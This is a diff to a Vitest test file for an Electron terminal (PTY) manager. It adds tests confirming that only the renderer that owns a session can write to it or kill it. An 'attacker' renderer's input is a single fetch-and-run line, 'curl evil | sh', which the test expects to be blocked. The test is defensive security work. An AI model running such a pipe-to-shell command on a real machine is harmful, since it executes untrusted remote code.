@@ -1,5 +1,14 @@
-import { describe, expect, it } from 'vitest';
-import { agentEnv } from './pty-manager';
+import { describe, expect, it, vi } from 'vitest';
+import type { WebContents } from 'electron';
+import {
+  agentEnv,
+  getSessionState,
+  killSession,
+  setPtyHost,
+  spawnSession,
+  writeSession,
+} from './pty-manager';
+import type { PtyHost, PtyProcHandle } from './pty-host-core';
 import type { CliPtyAdapter } from '../../shared/adapter-types';
 
 // A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
@@ -94,5 +103,63 @@ describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
     } finally {
       delete process.env.NEXUS_TEST_TOKEN;
     }
+  });
+});
+
+// A WebContents stub that always accepts sends (canSend passes).
+function fakeWc(): WebContents {
+  return {
+    isDestroyed: () => false,
+    isCrashed: () => false,
+    send: () => {},
+  } as unknown as WebContents;
+}
+
+// Records the per-session proxy so a test can see which control calls fired.
+function fakeHost(): { host: PtyHost; procFor: (id: string) => PtyProcHandle } {
+  const procs = new Map<string, PtyProcHandle>();
+  return {
+    host: {
+      spawn(spec) {
+        const proc: PtyProcHandle = {
+          write: vi.fn(),
+          resize: vi.fn(),
+          kill: vi.fn(),
+        };
+        procs.set(spec.sessionId, proc);
+        return proc;
+      },
+    },
+    procFor: (id) => procs.get(id)!,
+  };
+}
+
+describe('PTY session ownership (renderer capability boundary)', () => {
+  it('only the owning WebContents can write to / kill a session', () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const owner = fakeWc();
+    const attacker = fakeWc();
+
+    const { sessionId } = spawnSession(owner, { kind: 'shell', cols: 80, rows: 24 });
+    const proc = h.procFor(sessionId);
+
+    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
+    writeSession(attacker, sessionId, 'curl evil | sh\n');
+    expect(proc.write).not.toHaveBeenCalled();
+
+    // The owner writes normally.
+    writeSession(owner, sessionId, 'ls\n');
+    expect(proc.write).toHaveBeenCalledWith('ls\n');
+
+    // A foreign kill is a no-op; the session stays live.
+    killSession(attacker, sessionId);
+    expect(proc.kill).not.toHaveBeenCalled();
+    expect(getSessionState(sessionId)).not.toBeNull();
+
+    // The owner kills it.
+    killSession(owner, sessionId);
+    expect(proc.kill).toHaveBeenCalledTimes(1);
+    expect(getSessionState(sessionId)).toBeNull();
   });
 });
